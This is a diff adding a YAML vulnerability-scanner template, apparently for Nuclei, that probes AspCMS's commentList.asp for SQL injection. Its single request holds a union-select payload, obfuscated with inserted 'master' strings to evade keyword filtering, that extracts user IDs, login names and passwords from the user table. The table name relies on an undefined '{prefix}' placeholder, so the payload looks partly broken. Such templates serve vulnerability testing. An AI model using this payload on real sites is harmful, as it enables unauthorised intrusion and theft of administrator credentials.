@@ -1,0 +1,26 @@
+id: poc-yaml-aspcms-commentlist-asp-sqli
+info:
+  name: AspCMS commentList.asp SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    AspCMS系统中的commentList.asp页面存在SQL注入漏洞，允许远程攻击者通过构造恶意的SQL语句获取敏感数据。
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "发表于"
+          - "评论者"
+      - type: regex
+        part: body
+        regex:
+          - "<div class=\"line2\">.*?</div>"
